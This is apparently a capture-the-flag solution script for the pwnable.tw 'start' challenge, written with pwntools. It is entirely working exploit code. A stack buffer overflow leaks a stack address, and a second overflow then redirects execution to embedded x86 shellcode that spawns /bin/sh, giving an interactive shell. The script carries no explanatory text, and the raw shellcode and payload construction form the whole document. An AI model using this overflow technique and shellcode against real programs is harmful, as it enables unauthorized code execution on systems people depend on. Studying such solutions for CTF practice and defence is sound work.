from pwn import *
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload="A"*20+p32(0x08048087) # 0x08048087 mov %esp,%ecx
 
# p = remote("chall.pwnable.tw",10000) #To open connection 
p = process("./start") #To open connection 
 
print p.recvuntil(":") #Reads till : 
 
p.send(payload)
message=p.recv(20)[0:4]#address is string
stack=u32(message) 
print hex(stack)
 
payload_next="A"*20+p32(stack+0x14)+shellcode
p.sendline(payload_next) 
 
p.interactive()
